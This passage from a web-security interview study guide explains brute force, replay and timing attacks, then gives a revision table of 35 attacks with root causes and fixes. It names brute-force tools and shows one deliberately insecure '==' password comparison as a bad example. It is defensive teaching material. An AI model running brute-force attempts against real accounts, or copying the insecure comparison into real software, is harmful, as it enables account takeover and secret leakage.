**How it works:** Automated tool tries password combinations sequentially or from a wordlist/dictionary against a single username, relying on lack of throttling/lockout.

**Real Example:** Attacker targets `admin` account, tries `admin123`, `password`, `admin@123`, ...thousands of combos from a dictionary file — using tools like Hydra or Burp Intruder — until one works.

**Prevention:**
- Account lockout after N failed attempts (with care — watch for lockout-based DoS abuse too)
- CAPTCHA after a few failures
- Rate limiting/progressive delays
- MFA
- Strong password policy (longer, complex passwords make brute-force computationally infeasible)

**💬 Interview One-Liner:** "Brute Force is the simplest attack in the book — many passwords against one account — the classic fixes are lockout, CAPTCHA, and rate limiting, but MFA is what really kills it."

---

## 34. Replay Attack

**What it is:** Attacker captures a **valid, legitimate** request/data packet (like an authentication token or transaction) and **resends/replays** it later to repeat the action, without needing to understand or break the encryption.

**How it works:** Even if data is encrypted, if the app doesn't verify the request is "fresh" (unique, time-bound), a captured valid request can just be sent again and the server will process it as legit again.

**Real Example:** Attacker sniffs network traffic (on unsecured WiFi) and captures a valid "transfer $100 to Bob" API request (fully encrypted, attacker can't even read it, doesn't matter). Attacker just resends the exact same captured request packet again → server processes it again → another $100 transferred, because server had no way to tell "this exact request already happened."

**Prevention:**
- **Nonces** (number used once) — unique per-request token, server rejects if seen before
- Timestamps + short validity windows on requests
- Sequence numbers (like TCP)
- HMAC signatures tied to nonce + timestamp
- HTTPS/TLS (prevents easy sniffing, though doesn't fully solve replay by itself)

**💬 Interview One-Liner:** "Replay Attacks resend a captured VALID request as-is — encryption doesn't stop it, only nonces/timestamps that make the server recognize 'I've already processed this exact request' do."

---

## 35. Timing Attack

**What it is:** A side-channel attack where attacker infers secret information (passwords, keys) by measuring **how long** the app takes to respond to different inputs.

**How it works:** If code compares strings character-by-character and returns "wrong" the moment it hits a mismatch (`==` in many languages does this), a correct prefix takes **slightly longer** to fail than a completely wrong guess. Attacker measures tiny response-time differences to guess the secret one character at a time.

**Real Example:**
```python
if user_input == stored_password:   # BAD: not constant-time
```
If `stored_password = "abcdef"` and attacker tries `"azzzzz"` vs `"abzzzz"`, the second one takes microseconds longer because it matched one more character before failing. Repeating this character-by-character, attacker can reconstruct the whole password without ever needing the right guess directly — pure math/statistics on response times.

**Prevention:**
- Use **constant-time comparison functions** for secrets (e.g., `hmac.compare_digest()` in Python, `crypto.timingSafeEqual()` in Node.js)
- Never use simple `==` string comparison for passwords/tokens/HMACs
- Add random jitter/delay (weaker defense, constant-time compare is the real fix)
- Hash-then-compare doesn't fully solve it either — still need constant-time comparison of the hashes

**💬 Interview One-Liner:** "Timing Attacks measure microsecond differences in response time to leak secrets character-by-character — the fix is always constant-time comparison functions, never a plain `==` on secrets."

---

## Quick Revision Table (Night Before Interview)

| # | Attack | One Root Cause | One Fix |
|---|--------|----------------|---------|
| 1 | SQL Injection | Query built via string concat | Parameterized queries |
| 2 | NoSQL Injection | Trusting input type (JSON operators) | Strict type/schema validation |
| 3 | Command Injection | User input in shell command | `shell=False` + arg arrays |
| 4 | LDAP Injection | Unescaped LDAP filter chars | Escape special chars |
| 5 | XPath Injection | Unescaped XPath query build | Parameterized XPath |
| 6 | XSS (overview) | Missing output encoding | Encode output + CSP |
| 7 | Stored XSS | Payload saved in DB | Sanitize input, encode output |
| 8 | Reflected XSS | Payload reflected from URL | Encode reflected output |
| 9 | DOM XSS | Unsafe JS sink (`innerHTML`) | Use safe DOM APIs / sanitize |
| 10 | CSRF | Browser auto-sends cookies | CSRF token + SameSite |
| 11 | Broken Authentication | Weak session/login mgmt | MFA + secure sessions |
| 12 | Broken Access Control | No server-side authz check | Server-side deny-by-default |
| 13 | IDOR | No ownership check on object ID | Verify ownership server-side |
| 14 | SSRF | Server fetches attacker URL | Allow-list + block internal IPs |
| 15 | XXE | XML parser resolves external entity | Disable DTD processing |
| 16 | Path Traversal | Unsanitized file path (`../`) | Canonicalize + validate path |
| 17 | File Upload Vuln | Trusting extension not content | Check magic bytes, no-exec storage |
| 18 | Insecure Deserialization | Deserializing untrusted data | JSON + schema, avoid native deserialization |
| 19 | Open Redirect | Unvalidated redirect param | Allow-list redirect targets |
| 20 | Clickjacking | Page can be framed | `X-Frame-Options` / CSP `frame-ancestors` |
| 21 | Business Logic Attack | Flawed workflow assumption | Server-side rule enforcement |
| 22 | Mass Assignment | Auto-binding all JSON fields | Explicit allow-list/DTO |
| 23 | Race Condition | Check-then-use not atomic | Atomic transaction / row lock |
| 24 | Session Fixation | Session ID not regenerated | Regenerate session ID on login |
| 25 | Cookie Poisoning | Trusting unsigned cookie data | Sign/encrypt cookie, verify server-side |
| 26 | JWT Attack | Trusting token's own alg header | Hardcode expected algorithm |
| 27 | API Abuse | Weaker controls than UI | Same auth/validation as UI |
| 28 | GraphQL Attack | Unlimited query depth/introspection | Query cost limit, disable introspection |
| 29 | WebSocket Attack | No Origin check at handshake | Validate `Origin` header |
| 30 | Rate Limit Bypass | Trusting spoofable header | Multi-factor rate limiting |
| 31 | Credential Stuffing | Password reuse across sites | MFA |
| 32 | Password Spraying | Per-account lockout only | Cross-account pattern detection + MFA |
| 33 | Brute Force | No throttling on login | Lockout + CAPTCHA + MFA |
| 34 | Replay Attack | No freshness check on request | Nonce + timestamp |
| 35 | Timing Attack | Non-constant-time comparison | Constant-time compare function |

---

## Bonus Tip for Interview (from one student to another 😄)

Jokhon interviewer jiggesh korbe "explain any one attack", **always follow this structure**:
1. Definition (1 line)
2. How it happens (mechanism)
3. Small example (code/URL)
4. Impact (what attacker gains)
5. **Prevention** — ei ta bolte VOOLBE na, eta interviewer der shobcheye pochondo part!

Also — always connect attacks to **OWASP Top 10** if you can (e.g., "IDOR falls under Broken Access Control, which is OWASP's #1 category in 2021"). This shows you know the bigger picture, not just memorized facts. Best of luck bhai! 🚀
